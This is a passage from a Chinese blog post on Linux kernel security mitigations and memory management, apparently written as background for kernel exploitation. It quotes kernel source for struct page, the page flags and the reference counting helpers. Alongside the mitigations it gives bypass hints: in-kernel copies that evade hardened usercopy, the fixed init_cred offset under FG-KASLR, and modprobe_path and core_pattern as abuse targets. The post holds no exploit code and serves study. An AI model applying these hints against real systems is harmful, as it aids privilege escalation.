<li>读取的数据长度是否超出源 object 范围</li>
<li>写入的数据长度是否超出目的 object 范围</li>
</ul>
<p>不过这种保护 <em>不适用于内核空间内的数据拷贝</em> ，这也是目前主流的绕过手段</p>
<p>这一保护被用于 <code>copy_to_user()</code> 与 <code>copy_from_user()</code> 等数据交换 API 中。</p>
</li>
</ul>
<h3 id="地址相关"><a href="#地址相关" class="headerlink" title="地址相关"></a><strong>地址相关</strong></h3><ul>
<li><p>**<code>MMAP_MIN_ADDR</code>**：</p>
<p>内核空间和用户空间共享虚拟内存地址，因此需要防止用户空间 <code>mmap</code> 的内存从 <code>0</code> 开始，从而缓解空指针引用攻击。控制着<code>mmap</code>能够映射的最低内存地址，防止用户非法分配并访问低地址数据。不允许申请<code>NULL</code>地址 <code>mmap(0,....)</code>。</p>
</li>
<li><p>**<code>KASLR</code>**：</p>
<p><code>Kernel Address Space Layout Randomization</code>(内核地址空间布局随机化)，开启后，允许<code>kernel image</code>加载到<code>VMALLOC</code>区域的任何位置。在未开启KASLR保护机制时，内核代码段的基址为 <code>0xffffffff81000000</code>，<code>direct mapping area</code> 的基址为 <code>0xffff888000000000</code>。</p>
</li>
<li><p>**<code>FG-KASLR</code>**：</p>
<p><code>Function Granular Kernel Address Space Layout Randomization</code>细粒度的 <code>kaslr</code>，函数级别上的 <code>KASLR</code> 优化。该保护只是在代码段打乱顺序，在数据段偏移不变，例如 <code>commit_creds</code> 函数的偏移改变但是 <code>init_cred</code> 的偏移不变。</p>
</li>
</ul>
<h3 id="信息相关"><a href="#信息相关" class="headerlink" title="信息相关"></a><strong>信息相关</strong></h3><ul>
<li><p>**<code>Dmesg Restrictions</code>**：</p>
<p>通过设置<code>/proc/sys/kernel/dmesg_restrict</code>为1, 可以将<code>dmesg</code>输出的信息视为敏感信息(默认为0)</p>
</li>
<li><p>**<code>Kernel Address Display Restriction</code>**：</p>
<p>内核提供控制变量 <code>/proc/sys/kernel/kptr_restrict</code> 用于控制内核的一些输出打印。</p>
<ul>
<li><code>kptr_restrict == 2</code> :内核将符号地址打印为全 0 , root 和普通用户都没有权限.</li>
<li><code>kptr_restrict == 1</code> : root 用户有权限读取,普通用户没有权限.</li>
<li><code>kptr_restrict == 0</code> : root 和普通用户都可以读取.</li>
</ul>
<p><code>/proc/kallsyms</code>的内容需要<code>root</code>权限才能查看，如果以非<code>root</code>用户权限查看将显示地址为<code>0</code>。<code>kallsyms</code> 抽取了内核用到的所有函数地址(全局的,静态的)和非栈数据变量地址,生成一个数据块,作为只读数据链接进 <code>kernel image</code> 。要在内核中启用 <code>kallsyms</code> 功能,须设置 <code>CONFIG_KALLSYMS</code> 选项为 <code>y</code> ,如果要在 <code>kallsyms</code> 中包含全部符号信息,须设置 <code>CONFIG_KALLSYMS_ALL</code> 为 <code>y</code> 。<code>kallsyms</code> 表位于 <code>/proc/kallsyms</code> ，<code>kernel</code> 中的 <code>mod_tree</code> 处存放着各个模块加载的地址。</p>
</li>
</ul>
<h3 id="数据相关"><a href="#数据相关" class="headerlink" title="数据相关"></a><strong>数据相关</strong></h3><ul>
<li><p>**<code>HARDENED_USERCOPY</code>**：</p>
<p><code>hardened usercopy</code> 是用以在用户空间与内核空间之间拷贝数据时进行越界检查的一种防护机制，主要检查拷贝过程中对内核空间中数据的读写是否会越界，读取的数据长度是否超出源 <code>object</code> 范围，写入的数据长度是否超出目的 <code>object</code> 范围。不过这种保护不适用于内核空间内的数据拷贝 ，这也是目前主流的绕过手段这一保护被用于在使用 <code>copy_to_user()</code> 与 <code>copy_from_user()</code> 等数据交换 API 时用 <code>__check_object_size</code> 检查是否越界。</p>
</li>
<li><p>**<code>STATIC_USERMODEHELPER</code>**：</p>
<p>禁掉了对于 <code>modprobe_path</code> 和 <code>core_pattern</code> 的利用（只读区域）。</p>
</li>
</ul>
<h2 id="Linux-内核内存管理"><a href="#Linux-内核内存管理" class="headerlink" title="Linux 内核内存管理"></a>Linux 内核内存管理</h2><p>详细的 Linux 内核内存管理后续会专门新续一篇文，下文只是简述一下。</p>
<h3 id="物理内存"><a href="#物理内存" class="headerlink" title="物理内存"></a>物理内存</h3><p><a class="link"   target="_blank" rel="noopener" href="https://sky123.blog.csdn.net/article/details/130163993" >参考链接<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> <a class="link"   target="_blank" rel="noopener" href="https://www.zhihu.com/column/c_1444822980567805952" >参考链接<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<h4 id="page"><a href="#page" class="headerlink" title="page"></a>page</h4><p>Linux 内核内存管理的实现以 <code>page</code> 数据结构为核心，其他的内存管理设施都基于 <code>page</code> 数据结构，如 <code>VMA</code> 管理、缺页中断、<code>RMAP</code>、页面分配与回收等。<code>page</code> 数据结构定义在 <code>include/linux/mm_types.h</code> 头文件中，大量使用了 C 语言的联合体(union)来优化其数据结构的大小，因为每个物理页面都需要一个 <code>page</code> 数据结构来跟踪和管理这些物理页面的使用情况，所以管理成本很高。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span> &#123;</span></span><br><span class="line">    <span class="comment">// 第一部分，标志位</span></span><br><span class="line">    <span class="comment">/* 页面的标志位集合 */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> flags; </span><br><span class="line">					</span><br><span class="line">    <span class="comment">// 第二部分，40字节的联合体</span></span><br><span class="line">	<span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">	    <span class="comment">// 管理匿名页面/文件映射页面</span></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">            <span class="comment">/* LRU 链表节点，匿名页面或文件映射页面会通过该成员添加到 LRU 链表中 */</span></span><br><span class="line">			<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">lru</span>;</span> </span><br><span class="line">            <span class="comment">/* 表示页面所指向的地址空间 */</span></span><br><span class="line">			<span class="class"><span class="keyword">struct</span> <span class="title">address_space</span> *<span class="title">mapping</span>;</span></span><br><span class="line">            <span class="comment">/* 表示这个页面在一个映射中的序号或偏移量 */</span></span><br><span class="line">			<span class="type">pgoff_t</span> index;</span><br><span class="line">            <span class="comment">/* 指向私有数据的指针 */</span></span><br><span class="line">			<span class="type">unsigned</span> <span class="type">long</span> private;</span><br><span class="line">		&#125;;</span><br><span class="line">        <span class="comment">// 管理 slab/slob/slub 分配器</span></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> &#123;</span>	</span><br><span class="line">			<span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">				<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">slab_list</span>;</span>	</span><br><span class="line">				<span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">                    <span class="comment">/* 在 slub 分配器中使用 */</span></span><br><span class="line">					<span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">next</span>;</span></span><br><span class="line">					<span class="type">int</span> pages;	</span><br><span class="line">					<span class="type">int</span> pobjects;	</span><br><span class="line">				&#125;;</span><br><span class="line">			&#125;;</span><br><span class="line">            <span class="comment">/* slab 缓存描述符，slab 分配器中的第一个物理页面的 page 数据结构中的 slab cache 指向 slab 缓存描述符 */</span></span><br><span class="line">			<span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache</span> *<span class="title">slab_cache</span>;</span></span><br><span class="line">            <span class="comment">/* 管理区。管理区可以看作一个数组，数组的每个成员占用 1 字节，每个成员代表一个 slab 对象 */</span></span><br><span class="line">			<span class="type">void</span> *freelist;		</span><br><span class="line">			<span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">                <span class="comment">/* 在 slab 分配器中用来指向第一个 slab 对象的起始地址 */</span></span><br><span class="line">				<span class="type">void</span> *s_mem;	</span><br><span class="line">				<span class="type">unsigned</span> <span class="type">long</span> counters;		</span><br><span class="line">				<span class="class"><span class="keyword">struct</span> &#123;</span>			</span><br><span class="line">					<span class="type">unsigned</span> inuse:<span class="number">16</span>;</span><br><span class="line">					<span class="type">unsigned</span> objects:<span class="number">15</span>;</span><br><span class="line">					<span class="type">unsigned</span> frozen:<span class="number">1</span>;</span><br><span class="line">				&#125;;</span><br><span class="line">			&#125;;</span><br><span class="line">		&#125;;</span><br><span class="line">		<span class="class"><span class="keyword">struct</span> &#123;</span>	</span><br><span class="line">			<span class="type">unsigned</span> <span class="type">long</span> compound_head;	</span><br><span class="line">			<span class="type">unsigned</span> <span class="type">char</span> compound_dtor;</span><br><span class="line">			<span class="type">unsigned</span> <span class="type">char</span> compound_order;</span><br><span class="line">			<span class="type">atomic_t</span> compound_mapcount;</span><br><span class="line">		&#125;;</span><br><span class="line">		<span class="class"><span class="keyword">struct</span> &#123;</span>	</span><br><span class="line">			<span class="type">unsigned</span> <span class="type">long</span> _compound_pad_1;	</span><br><span class="line">			<span class="type">unsigned</span> <span class="type">long</span> _compound_pad_2;</span><br><span class="line">			<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">deferred_list</span>;</span></span><br><span class="line">		&#125;;</span><br><span class="line">		<span class="comment">// 管理页表</span></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> &#123;</span>	</span><br><span class="line">			<span class="type">unsigned</span> <span class="type">long</span> _pt_pad_1;	</span><br><span class="line">			<span class="type">pgtable_t</span> pmd_huge_pte;</span><br><span class="line">			<span class="type">unsigned</span> <span class="type">long</span> _pt_pad_2;</span><br><span class="line">			<span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">				<span class="class"><span class="keyword">struct</span> <span class="title">mm_struct</span> *<span class="title">pt_mm</span>;</span> </span><br><span class="line">				<span class="type">atomic_t</span> pt_frag_refcount; </span><br><span class="line">			&#125;;</span><br><span class="line">            <span class="comment">/* 用于保护页表操作的自旋锁，通常在更新页表时候需要这个锁以进行保护 */</span></span><br><span class="line">			<span class="type">spinlock_t</span> ptl;</span><br><span class="line">		&#125;;</span><br><span class="line">		<span class="comment">// 管理 ZONE_DEVICE 页面</span></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> &#123;</span>	</span><br><span class="line">			<span class="class"><span class="keyword">struct</span> <span class="title">dev_pagemap</span> *<span class="title">pgmap</span>;</span></span><br><span class="line">			<span class="type">unsigned</span> <span class="type">long</span> hmm_data;</span><br><span class="line">			<span class="type">unsigned</span> <span class="type">long</span> _zd_pad_1;	</span><br><span class="line">		&#125;;</span><br><span class="line">        <span class="comment">/* RCU 锁，在 slab 分配器中释放slab 的物理页面 */</span></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span> <span class="title">rcu_head</span>;</span></span><br><span class="line">	&#125;;</span><br><span class="line">    <span class="comment">// 第三部分，4字节的联合体，管理 _mapcount 等</span></span><br><span class="line">	<span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        <span class="comment">/* 用于统计 _mapcount */</span></span><br><span class="line">		<span class="type">atomic_t</span> _mapcount;</span><br><span class="line">		<span class="type">unsigned</span> <span class="type">int</span> page_type;</span><br><span class="line">        <span class="comment">/* </span></span><br><span class="line"><span class="comment">        *  表示slab分配器中活跃对象的数量。当为0时，表示这个slab分配器中没有活跃对象，可以销毁这个slab分配器。</span></span><br><span class="line"><span class="comment">        *  活跃对象就是已经被迁移到对象缓冲池中的对象 </span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">		<span class="type">unsigned</span> <span class="type">int</span> active;		</span><br><span class="line">		<span class="type">int</span> units;			</span><br><span class="line">	&#125;;</span><br><span class="line">	<span class="comment">// 第四部分，_refcount 引用计数</span></span><br><span class="line">	<span class="type">atomic_t</span> _refcount;</span><br><span class="line">&#125; _struct_page_alignment;</span><br></pre></td></tr></table></figure></div>

<h4 id="page-中的重要字段"><a href="#page-中的重要字段" class="headerlink" title="page 中的重要字段"></a>page 中的重要字段</h4><h5 id="flags"><a href="#flags" class="headerlink" title="flags"></a>flags</h5><p><code>flags</code> 成员是页面的标志位集合，标志位是内存管理中非常重要的部分，具体定义在 <code>include/linux/page-flags.h</code> 文件中，重要的标志位如下。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">pageflags</span> &#123;</span></span><br><span class="line">    <span class="comment">/* 表示页面已经上锁了。如果该位置位，说明页面已经上锁，内存管理的其他模块不能访问这个页面，以防发生竞争 */</span></span><br><span class="line">	PG_locked,		<span class="comment">/* Page is locked. Don&#x27;t touch. */</span></span><br><span class="line">    <span class="comment">/* 用于控制页面的活跃程度，在 kswapd 页面回收中使用 */</span></span><br><span class="line">	PG_referenced,</span><br><span class="line">    <span class="comment">/* 表示页面的数据已经从块设备成功读取。 */</span></span><br><span class="line">	PG_uptodate,</span><br><span class="line">    <span class="comment">/* 表示页面内容发生改变，这个页面为脏页，即页面的内容被改写后还没有和外部存储器进行过同步操作 */</span></span><br><span class="line">	PG_dirty,</span><br><span class="line">    <span class="comment">/* 表示页面在LRU链表中。LRU链表指最近最少使用(Least Recently Used)链表。内核使用LRU链表来管理活跃和不活跃页面 */</span></span><br><span class="line">	PG_lru,</span><br><span class="line">    <span class="comment">/* 用于控制页面的活跃程度，在 kswapd 页面回收中使用。 */</span></span><br><span class="line">	PG_active,</span><br><span class="line">	PG_workingset,</span><br><span class="line">    <span class="comment">/* 表示有进程在等待这个页面。 */</span></span><br><span class="line">	PG_waiters,</span><br><span class="line">    <span class="comment">/* 表示页面操作过程中发生I/O错误时会设置该位。 */</span></span><br><span class="line">	PG_error,</span><br><span class="line">    <span class="comment">/* 表示页面用于 slab 分配器。 */</span></span><br><span class="line">	PG_slab,</span><br><span class="line">	PG_owner_priv_1,	<span class="comment">/* Owner use. If pagecache, fs may use*/</span></span><br><span class="line">	PG_arch_1,</span><br><span class="line">	PG_reserved,</span><br><span class="line">	PG_private,		<span class="comment">/* If pagecache, has fs-private data */</span></span><br><span class="line">	PG_private_2,		<span class="comment">/* If pagecache, has fs aux data */</span></span><br><span class="line">    <span class="comment">/* 表示页面的内容正在向块设备回写。 */</span></span><br><span class="line">	PG_writeback,		<span class="comment">/* Page is under writeback */</span></span><br><span class="line">	PG_head,		<span class="comment">/* A head page */</span></span><br><span class="line">	PG_mappedtodisk,	<span class="comment">/* Has blocks allocated on-disk */</span></span><br><span class="line">	<span class="comment">/* 表示这个页面马上要被回收。 */</span></span><br><span class="line">    PG_reclaim,		<span class="comment">/* To be reclaimed asap */</span></span><br><span class="line">    <span class="comment">/* 表示页面具有 swap 缓存功能，通常匿名页面才可以写回交换分区。 */</span></span><br><span class="line">	PG_swapbacked,		<span class="comment">/* Page is backed by RAM/swap */</span></span><br><span class="line">    <span class="comment">/* 表示页面不可被回收。 */</span></span><br><span class="line">	PG_unevictable,		<span class="comment">/* Page is &quot;unevictable&quot;  */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_MMU</span></span><br><span class="line">    <span class="comment">/* 表示页面对应的 VMA 处于 mlocked 状态。 */</span></span><br><span class="line">	PG_mlocked,		<span class="comment">/* Page is vma mlocked */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_ARCH_USES_PG_UNCACHED</span></span><br><span class="line">	PG_uncached,		<span class="comment">/* Page has been mapped as uncached */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_MEMORY_FAILURE</span></span><br><span class="line">	PG_hwpoison,		<span class="comment">/* hardware poisoned page. Don&#x27;t touch */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined(CONFIG_IDLE_PAGE_TRACKING) &amp;&amp; defined(CONFIG_64BIT)</span></span><br><span class="line">	PG_young,</span><br><span class="line">	PG_idle,</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	__NR_PAGEFLAGS,</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Filesystems */</span></span><br><span class="line">	PG_checked = PG_owner_priv_1,</span><br><span class="line">    <span class="comment">/* 表示页面处于交换缓存中。 */</span></span><br><span class="line">	PG_swapcache = PG_owner_priv_1,	<span class="comment">/* Swap page: swp_entry_t in private */</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Two page bits are conscripted by FS-Cache to maintain local caching</span></span><br><span class="line"><span class="comment">	 * state.  These bits are set on pages belonging to the netfs&#x27;s inodes</span></span><br><span class="line"><span class="comment">	 * when those inodes are being locally cached.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	PG_fscache = PG_private_2,	<span class="comment">/* page backed by cache */</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* XEN */</span></span><br><span class="line">	<span class="comment">/* Pinned in Xen as a read-only pagetable page. */</span></span><br><span class="line">	PG_pinned = PG_owner_priv_1,</span><br><span class="line">	<span class="comment">/* Pinned as part of domain save (see xen_mm_pin_all()). */</span></span><br><span class="line">	PG_savepinned = PG_dirty,</span><br><span class="line">	<span class="comment">/* Has a grant mapping of another (foreign) domain&#x27;s page. */</span></span><br><span class="line">	PG_foreign = PG_owner_priv_1,</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* SLOB */</span></span><br><span class="line">	PG_slob_free = PG_private,</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Compound pages. Stored in first tail page&#x27;s flags */</span></span><br><span class="line">	PG_double_map = PG_private_2,</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* non-lru isolated movable page */</span></span><br><span class="line">	PG_isolated = PG_reclaim,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>

<p>内核定义了一些宏，用于检查页面是否设置了某个特定的标志位或者用于操作某些标志位。这些宏的名称都有一定的模式，<a class="link"   target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v6.7/source/include/linux/page-flags.h" >具体如下<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>。</p>
<ul>
<li><code>PageXXX()</code>用于检查页面是否设置了 <code>PG_XXX</code> 标志位，如 <code>PageLRU()</code> 检查<code>PG_lru</code> 标志位是否置位了，<code>PageDirty()</code> 检查 <code>PG_dirty</code> 是否置位了。</li>
<li><code>SetPageXX()</code> 设置页面中的 <code>PG_XXX</code> 标志位，如 <code>SetPageLRU()</code> 用于设置 <code>PG_lru</code> ,<code>SetPageDirty()</code> 用于设置 <code>PG_dirty</code> 标志位。</li>
<li><code>ClearPageXXX()</code> 用于无条件地清除某个特定的标志位。</li>
</ul>
<h5 id="mapping"><a href="#mapping" class="headerlink" title="mapping"></a>mapping</h5><p><code>mapping</code> 成员表示页面所指向的地址空间。内核中的地址空间通常有两个不同的地址空间：</p>
<ul>
<li>一个用于文件映射页面，如在读取文件时，地址空间用于将文件的内容数据与装载数据的存储介质区关联起来；</li>
<li>另一个用于匿名映射。</li>
</ul>
<p>内核使用一个简单直接的方式实现了“一个指针，两种用途”，<code>mapping</code> 成员的最低两位用于判断是否指向匿名映射或 KSM 页面的地址空间。如果指向匿名页面，那么 <code>mapping</code> 成员指向匿名页面的地址空间数据结构 <code>anon_vma</code> 。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> PAGE_MAPPING_ANON	0x1</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PAGE_MAPPING_MOVABLE	0x2</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PAGE_MAPPING_KSM	(PAGE_MAPPING_ANON | PAGE_MAPPING_MOVABLE)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PAGE_MAPPING_FLAGS	(PAGE_MAPPING_ANON | PAGE_MAPPING_MOVABLE)</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> __always_inline <span class="type">int</span> <span class="title function_">PageMappingFlags</span><span class="params">(<span class="keyword">struct</span> page *page)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">return</span> ((<span class="type">unsigned</span> <span class="type">long</span>)page-&gt;mapping &amp; PAGE_MAPPING_FLAGS) != <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> __always_inline <span class="type">int</span> <span class="title function_">PageAnon</span><span class="params">(<span class="keyword">struct</span> page *page)</span></span><br><span class="line">&#123;</span><br><span class="line">	page = compound_head(page);</span><br><span class="line">	<span class="keyword">return</span> ((<span class="type">unsigned</span> <span class="type">long</span>)page-&gt;mapping &amp; PAGE_MAPPING_ANON) != <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> __always_inline <span class="type">int</span> __PageMovable(<span class="keyword">struct</span> page *page)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">return</span> ((<span class="type">unsigned</span> <span class="type">long</span>)page-&gt;mapping &amp; PAGE_MAPPING_FLAGS) ==</span><br><span class="line">				PAGE_MAPPING_MOVABLE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h5 id="refcount"><a href="#refcount" class="headerlink" title="_refcount"></a>_refcount</h5><p><code>_refcount</code> 表示内核中引用该页面的次数。</p>
<ul>
<li>当 <code>_refcount</code> 的值为 0 时，表示该页面为空闲页面或即将要被释放的页面。</li>
<li>当 <code>_refcount</code> 的值大于 0 时，表示该页面已经被分配且内核正在使用，暂时不会被释放。</li>
</ul>
<p>内核中提供加&#x2F;减 <code>_refcount</code> 的接口函数，读者应该使用这些接口函数来使用 <code>_refcount</code> 引用计数。</p>
<ul>
<li><code>get_page()</code>: <code>_refcount</code> 加 1 。</li>
<li><code>put_page()</code>: <code>_refcount</code> 减 1 。若 <code>_refcount</code> 减 1 后等于 0 ,那么会释放该页面。</li>
</ul>
<p>这两个接口函数实现在 <code>include/linux/mm.h</code> 文件中。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 函数调用 page ref_inc() 来增加引用计数，最后使用 atomic_inc() 函数原子地增加引用计数。 */</span></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span> <span class="title function_">get_page</span><span class="params">(<span class="keyword">struct</span> page *page)</span></span><br><span class="line">&#123;</span><br><span class="line">	page = compound_head(page);</span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Getting a normal page or the head of a compound page</span></span><br><span class="line"><span class="comment">	 * requires to already have an elevated page-&gt;_refcount.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	VM_BUG_ON_PAGE(page_ref_count(page) &lt;= <span class="number">0</span>, page);</span><br><span class="line">	page_ref_inc(page);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span> <span class="title function_">put_page</span><span class="params">(<span class="keyword">struct</span> page *page)</span></span><br><span class="line">&#123;</span><br><span class="line">	page = compound_head(page);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * For devmap managed pages we need to catch refcount transition from</span></span><br><span class="line"><span class="comment">	 * 2 to 1, when refcount reach one it means the page is free and we</span></span><br><span class="line"><span class="comment">	 * need to inform the device driver through callback. See</span></span><br><span class="line"><span class="comment">	 * include/linux/memremap.h and HMM for details.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">if</span> (put_devmap_managed_page(page))</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	*  首先使用 put_page_testzero() 函数来使 _refcount 减 1 并且判断其是否为 0 。</span></span><br><span class="line"><span class="comment">	*  如果 _refcount 减 1 之后等于 0 ,就会调用 _put_page() 来释放这个页面。</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line">	<span class="keyword">if</span> (put_page_testzero(page))</span><br><span class="line">		__put_page(page);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h5 id="mapcount"><a href="#mapcount" class="headerlink" title="_mapcount"></a>_mapcount</h5><p><code>_mapcount</code> 表示这个页面被进程映射的个数，即已经映射了多少个用户 PTE 。<br> 每个用户进程都拥有各自独立的虚拟空间（256TB）和一份独立的页表，所以可能出现多个用户进程地址空间同时映射到一个物理页面的情况，RMAP 系统就是利用这个特性来实现的。<code>_mapcount</code> 主要用于RMAP系统中。</p>
<ul>
